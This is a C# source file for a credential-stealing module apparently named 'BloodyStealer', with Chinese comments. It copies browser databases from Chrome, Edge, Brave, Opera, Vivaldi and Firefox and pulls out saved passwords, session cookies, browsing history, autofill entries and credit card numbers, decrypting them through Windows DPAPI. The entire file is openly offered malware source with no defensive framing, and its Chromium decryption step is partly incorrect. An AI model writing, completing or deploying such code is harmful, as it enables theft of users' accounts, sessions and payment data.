using System;
using System.IO;
using System.Linq;
using System.Text;
using System.Data.SQLite;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using System.Text.RegularExpressions;

namespace BloodyStealer.Stealers
{
    /// <summary>
    /// 浏览器数据窃取类，负责从不同浏览器获取敏感数据
    /// </summary>
    internal class BrowserStealer
    {
        #region 数据结构
        
        /// <summary>
        /// 浏览器信息结构
        /// </summary>
        private class BrowserInfo
        {
            public string Name { get; set; }
            public string ProfilePath { get; set; }
            public string[] DataFileNames { get; set; }
        }
        
        /// <summary>
        /// 浏览器凭据信息
        /// </summary>
        public class Credential
        {
            public string Browser { get; set; }
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
        }
        
        /// <summary>
        /// 浏览器Cookie信息
        /// </summary>
        public class Cookie
        {
            public string Browser { get; set; }
            public string Host { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
            public string Path { get; set; }
            public DateTime? Expires { get; set; }
            public bool IsSecure { get; set; }
            public bool IsHttpOnly { get; set; }
        }
        
        /// <summary>
        /// 浏览历史记录信息
        /// </summary>
        public class HistoryItem
        {
            public string Browser { get; set; }
            public string Url { get; set; }
            public string Title { get; set; }
            public DateTime? VisitTime { get; set; }
            public int VisitCount { get; set; }
        }
        
        /// <summary>
        /// 浏览器自动填充信息
        /// </summary>
        public class AutofillData
        {
            public string Browser { get; set; }
            public string Name { get; set; }
            public string Value { get; set; }
        }
        
        /// <summary>
        /// 信用卡信息
        /// </summary>
        public class CreditCard
        {
            public string Browser { get; set; }
            public string Name { get; set; }
            public string Number { get; set; }
            public string ExpMonth { get; set; }
            public string ExpYear { get; set; }
        }
        
        #endregion
        
        #region 属性和字段
        
        /// <summary>
        /// 收集到的凭据列表
        /// </summary>
        public List<Credential> Credentials { get; private set; } = new List<Credential>();
        
        /// <summary>
        /// 收集到的Cookie列表
        /// </summary>
        public List<Cookie> Cookies { get; private set; } = new List<Cookie>();
        
        /// <summary>
        /// 收集到的浏览历史列表
        /// </summary>
        public List<HistoryItem> History { get; private set; } = new List<HistoryItem>();
        
        /// <summary>
        /// 收集到的自动填充数据列表
        /// </summary>
        public List<AutofillData> Autofill { get; private set; } = new List<AutofillData>();
        
        /// <summary>
        /// 收集到的信用卡信息列表
        /// </summary>
        public List<CreditCard> CreditCards { get; private set; } = new List<CreditCard>();
        
        /// <summary>
        /// 支持的浏览器配置信息
        /// </summary>
        private List<BrowserInfo> _browsers;
        
        /// <summary>
        /// 临时文件路径
        /// </summary>
        private string _tempPath;
        
        #endregion
        
        #region 构造函数
        
        /// <summary>
        /// 初始化浏览器数据窃取器
        /// </summary>
        public BrowserStealer()
        {
            _tempPath = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            Directory.CreateDirectory(_tempPath);
            
            InitializeBrowsers();
        }
        
        /// <summary>
        /// 初始化支持的浏览器配置
        /// </summary>
        private void InitializeBrowsers()
        {
            string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            
            _browsers = new List<BrowserInfo>
            {
                // Chrome
                new BrowserInfo
                {
                    Name = "Chrome",
                    ProfilePath = Path.Combine(localAppData, @"Google\Chrome\User Data"),
                    DataFileNames = new[] { "Login Data", "Cookies", "History", "Web Data" }
                },
                
                // Edge
                new BrowserInfo
                {
                    Name = "Edge",
                    ProfilePath = Path.Combine(localAppData, @"Microsoft\Edge\User Data"),
                    DataFileNames = new[] { "Login Data", "Cookies", "History", "Web Data" }
                },
                
                // Brave
                new BrowserInfo
                {
                    Name = "Brave",
                    ProfilePath = Path.Combine(localAppData, @"BraveSoftware\Brave-Browser\User Data"),
                    DataFileNames = new[] { "Login Data", "Cookies", "History", "Web Data" }
                },
                
                // Opera
                new BrowserInfo
                {
                    Name = "Opera",
                    ProfilePath = Path.Combine(appData, @"Opera Software\Opera Stable"),
                    DataFileNames = new[] { "Login Data", "Cookies", "History", "Web Data" }
                },
                
                // Firefox (特殊处理)
                new BrowserInfo
                {
                    Name = "Firefox",
                    ProfilePath = Path.Combine(appData, @"Mozilla\Firefox\Profiles"),
                    DataFileNames = new[] { "logins.json", "cookies.sqlite", "places.sqlite" }
                },
                
                // Vivaldi
                new BrowserInfo
                {
                    Name = "Vivaldi",
                    ProfilePath = Path.Combine(localAppData, @"Vivaldi\User Data"),
                    DataFileNames = new[] { "Login Data", "Cookies", "History", "Web Data" }
                }
            };
        }
        
        #endregion
        
        #region 公共方法
        
        /// <summary>
        /// 执行所有浏览器数据收集
        /// </summary>
        public void StealAll()
        {
            try
            {
                foreach (var browser in _browsers)
                {
                    StealFromBrowser(browser);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in StealAll: {ex.Message}");
            }
            finally
            {
                // 清理临时文件
                try
                {
                    if (Directory.Exists(_tempPath))
                    {
                        Directory.Delete(_tempPath, true);
                    }
                }
                catch { /* 忽略清理错误 */ }
            }
        }
        
        /// <summary>
        /// 获取收集到的统计信息
        /// </summary>
        /// <returns>统计信息字符串</returns>
        public string GetStatistics()
        {
            return $"凭据: {Credentials.Count}\n" +
                   $"Cookie: {Cookies.Count}\n" +
                   $"历史记录: {History.Count}\n" +
                   $"自动填充: {Autofill.Count}\n" +
                   $"信用卡: {CreditCards.Count}";
        }
        
        #endregion
        
        #region 私有方法
        
        /// <summary>
        /// 从特定浏览器窃取数据
        /// </summary>
        /// <param name="browser">浏览器信息</param>
        private void StealFromBrowser(BrowserInfo browser)
        {
            try
            {
                if (!Directory.Exists(browser.ProfilePath))
                {
                    return;
                }
                
                // 特殊处理Firefox浏览器
                if (browser.Name == "Firefox")
                {
                    StealFromFirefox(browser);
                    return;
                }
                
                // 处理其他基于Chromium的浏览器
                string[] profiles = { "Default", "Profile 1", "Profile 2", "Profile 3" };
                
                foreach (string profile in profiles)
                {
                    string profileFolder = Path.Combine(browser.ProfilePath, profile);
                    
                    if (!Directory.Exists(profileFolder))
                    {
                        continue;
                    }
                    
                    // 窃取不同类型数据
                    StealCredentials(browser, profileFolder);
                    StealCookies(browser, profileFolder);
                    StealHistory(browser, profileFolder);
                    StealAutofill(browser, profileFolder);
                    StealCreditCards(browser, profileFolder);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从特定浏览器窃取凭据
        /// </summary>
        private void StealCredentials(BrowserInfo browser, string profilePath)
        {
            try
            {
                string loginDataFile = Path.Combine(profilePath, "Login Data");
                
                if (!File.Exists(loginDataFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"{browser.Name}_{Guid.NewGuid()}_Login.db");
                File.Copy(loginDataFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand("SELECT origin_url, username_value, password_value FROM logins", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["origin_url"].ToString();
                            string username = reader["username_value"].ToString();
                            string password = string.Empty;
                            
                            try
                            {
                                // 解密密码
                                byte[] encryptedBytes = (byte[])reader["password_value"];
                                password = DecryptChromePassword(encryptedBytes);
                            }
                            catch
                            {
                                password = "[加密错误]";
                            }
                            
                            if (!string.IsNullOrEmpty(username) || !string.IsNullOrEmpty(password))
                            {
                                Credentials.Add(new Credential
                                {
                                    Browser = browser.Name,
                                    Url = url,
                                    Username = username,
                                    Password = password
                                });
                            }
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing credentials from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从特定浏览器窃取Cookie
        /// </summary>
        private void StealCookies(BrowserInfo browser, string profilePath)
        {
            try
            {
                string cookieFile = Path.Combine(profilePath, "Cookies");
                
                if (!File.Exists(cookieFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"{browser.Name}_{Guid.NewGuid()}_Cookies.db");
                File.Copy(cookieFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand(
                        "SELECT host_key, name, path, encrypted_value, expires_utc, is_secure, is_httponly FROM cookies", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string host = reader["host_key"].ToString();
                            string name = reader["name"].ToString();
                            string path = reader["path"].ToString();
                            string value = string.Empty;
                            
                            try
                            {
                                // 解密Cookie值
                                byte[] encryptedBytes = (byte[])reader["encrypted_value"];
                                value = DecryptChromePassword(encryptedBytes);
                            }
                            catch
                            {
                                value = "[加密错误]";
                            }
                            
                            long expiresUtc = Convert.ToInt64(reader["expires_utc"]);
                            DateTime? expires = null;
                            
                            if (expiresUtc > 0)
                            {
                                // Chrome时间戳转换为DateTime
                                expires = new DateTime(1601, 1, 1).AddMilliseconds(expiresUtc / 1000.0);
                            }
                            
                            bool isSecure = Convert.ToBoolean(reader["is_secure"]);
                            bool isHttpOnly = Convert.ToBoolean(reader["is_httponly"]);
                            
                            Cookies.Add(new Cookie
                            {
                                Browser = browser.Name,
                                Host = host,
                                Name = name,
                                Value = value,
                                Path = path,
                                Expires = expires,
                                IsSecure = isSecure,
                                IsHttpOnly = isHttpOnly
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing cookies from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从特定浏览器窃取历史记录
        /// </summary>
        private void StealHistory(BrowserInfo browser, string profilePath)
        {
            try
            {
                string historyFile = Path.Combine(profilePath, "History");
                
                if (!File.Exists(historyFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"{browser.Name}_{Guid.NewGuid()}_History.db");
                File.Copy(historyFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand(
                        "SELECT url, title, visit_count, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["url"].ToString();
                            string title = reader["title"].ToString();
                            int visitCount = Convert.ToInt32(reader["visit_count"]);
                            long visitTime = Convert.ToInt64(reader["last_visit_time"]);
                            
                            DateTime? lastVisit = null;
                            if (visitTime > 0)
                            {
                                // Chrome时间戳转换为DateTime
                                lastVisit = new DateTime(1601, 1, 1).AddMilliseconds(visitTime / 1000.0);
                            }
                            
                            History.Add(new HistoryItem
                            {
                                Browser = browser.Name,
                                Url = url,
                                Title = title,
                                VisitCount = visitCount,
                                VisitTime = lastVisit
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing history from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从特定浏览器窃取自动填充数据
        /// </summary>
        private void StealAutofill(BrowserInfo browser, string profilePath)
        {
            try
            {
                string webDataFile = Path.Combine(profilePath, "Web Data");
                
                if (!File.Exists(webDataFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"{browser.Name}_{Guid.NewGuid()}_WebData.db");
                File.Copy(webDataFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand("SELECT name, value FROM autofill", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string name = reader["name"].ToString();
                            string value = reader["value"].ToString();
                            
                            Autofill.Add(new AutofillData
                            {
                                Browser = browser.Name,
                                Name = name,
                                Value = value
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing autofill from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从特定浏览器窃取信用卡信息
        /// </summary>
        private void StealCreditCards(BrowserInfo browser, string profilePath)
        {
            try
            {
                string webDataFile = Path.Combine(profilePath, "Web Data");
                
                if (!File.Exists(webDataFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"{browser.Name}_{Guid.NewGuid()}_WebData.db");
                File.Copy(webDataFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand(
                        "SELECT name_on_card, card_number_encrypted, expiration_month, expiration_year FROM credit_cards", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string name = reader["name_on_card"].ToString();
                            string number = string.Empty;
                            
                            try
                            {
                                // 解密信用卡号
                                byte[] encryptedBytes = (byte[])reader["card_number_encrypted"];
                                number = DecryptChromePassword(encryptedBytes);
                            }
                            catch
                            {
                                number = "[加密错误]";
                            }
                            
                            string month = reader["expiration_month"].ToString();
                            string year = reader["expiration_year"].ToString();
                            
                            CreditCards.Add(new CreditCard
                            {
                                Browser = browser.Name,
                                Name = name,
                                Number = number,
                                ExpMonth = month,
                                ExpYear = year
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing credit cards from {browser.Name}: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从Firefox浏览器窃取数据
        /// </summary>
        private void StealFromFirefox(BrowserInfo browser)
        {
            try
            {
                if (!Directory.Exists(browser.ProfilePath))
                {
                    return;
                }
                
                // 查找Firefox配置文件（它们通常以.default结尾）
                string[] profileFolders = Directory.GetDirectories(browser.ProfilePath);
                
                foreach (string profileFolder in profileFolders)
                {
                    // 窃取Firefox Cookie
                    StealFirefoxCookies(browser, profileFolder);
                    
                    // 窃取Firefox历史记录
                    StealFirefoxHistory(browser, profileFolder);
                    
                    // Firefox凭据存储在一个特殊的存储文件中
                    // 这需要更复杂的处理，超出当前实现范围
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing from Firefox: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从Firefox窃取Cookie
        /// </summary>
        private void StealFirefoxCookies(BrowserInfo browser, string profileFolder)
        {
            try
            {
                string cookieFile = Path.Combine(profileFolder, "cookies.sqlite");
                
                if (!File.Exists(cookieFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"Firefox_{Guid.NewGuid()}_Cookies.db");
                File.Copy(cookieFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand(
                        "SELECT host, name, path, value, expiry, isSecure, isHttpOnly FROM moz_cookies", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string host = reader["host"].ToString();
                            string name = reader["name"].ToString();
                            string path = reader["path"].ToString();
                            string value = reader["value"].ToString();
                            
                            long expiryUnix = Convert.ToInt64(reader["expiry"]);
                            DateTime? expires = null;
                            
                            if (expiryUnix > 0)
                            {
                                // Unix时间戳转换为DateTime
                                expires = new DateTime(1970, 1, 1).AddSeconds(expiryUnix);
                            }
                            
                            bool isSecure = Convert.ToBoolean(reader["isSecure"]);
                            bool isHttpOnly = Convert.ToBoolean(reader["isHttpOnly"]);
                            
                            Cookies.Add(new Cookie
                            {
                                Browser = "Firefox",
                                Host = host,
                                Name = name,
                                Value = value,
                                Path = path,
                                Expires = expires,
                                IsSecure = isSecure,
                                IsHttpOnly = isHttpOnly
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Firefox cookies: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 从Firefox窃取历史记录
        /// </summary>
        private void StealFirefoxHistory(BrowserInfo browser, string profileFolder)
        {
            try
            {
                string historyFile = Path.Combine(profileFolder, "places.sqlite");
                
                if (!File.Exists(historyFile))
                {
                    return;
                }
                
                string tempFile = Path.Combine(_tempPath, $"Firefox_{Guid.NewGuid()}_History.db");
                File.Copy(historyFile, tempFile, true);
                
                using (var conn = new SQLiteConnection($"Data Source={tempFile};Version=3;"))
                {
                    conn.Open();
                    using (var cmd = new SQLiteCommand(
                        "SELECT url, title, visit_count, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000", conn))
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string url = reader["url"].ToString();
                            string title = reader["title"]?.ToString() ?? "";
                            int visitCount = Convert.ToInt32(reader["visit_count"]);
                            
                            long visitTimeMs = 0;
                            if (reader["last_visit_date"] != DBNull.Value)
                            {
                                visitTimeMs = Convert.ToInt64(reader["last_visit_date"]);
                            }
                            
                            DateTime? lastVisit = null;
                            if (visitTimeMs > 0)
                            {
                                // Firefox使用从1970年1月1日起的微秒数
                                lastVisit = new DateTime(1970, 1, 1).AddMilliseconds(visitTimeMs / 1000);
                            }
                            
                            History.Add(new HistoryItem
                            {
                                Browser = "Firefox",
                                Url = url,
                                Title = title,
                                VisitCount = visitCount,
                                VisitTime = lastVisit
                            });
                        }
                    }
                    conn.Close();
                }
                
                // 清理临时文件
                try { File.Delete(tempFile); } catch { }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error stealing Firefox history: {ex.Message}");
            }
        }
        
        /// <summary>
        /// 解密Chrome/Chromium浏览器加密数据
        /// </summary>
        /// <param name="encryptedData">加密的数据</param>
        /// <returns>解密后的字符串</returns>
        private string DecryptChromePassword(byte[] encryptedData)
        {
            try
            {
                // 检查是否为DPAPI加密（以v10或v01开头）
                if (encryptedData.Length >= 3 && encryptedData[0] == 'v' && encryptedData[1] == '1' && encryptedData[2] == '0' ||
                    encryptedData.Length >= 3 && encryptedData[0] == 'v' && encryptedData[1] == '0' && encryptedData[2] == '1')
                {
                    // DPAPI加密，需要使用WindowsAPI解密
                    byte[] decryptedData = ProtectedData.Unprotect(
                        encryptedData.Skip(3).ToArray(), // 跳过前缀'v10'或'v01'
                        null,
                        DataProtectionScope.CurrentUser);
                    
                    return Encoding.UTF8.GetString(decryptedData);
                }
                
                // 对于更简单的情况，直接尝试转换
                return Encoding.UTF8.GetString(encryptedData);
            }
            catch
            {
                return "[无法解密]";
            }
        }
        
        #endregion
    }
} 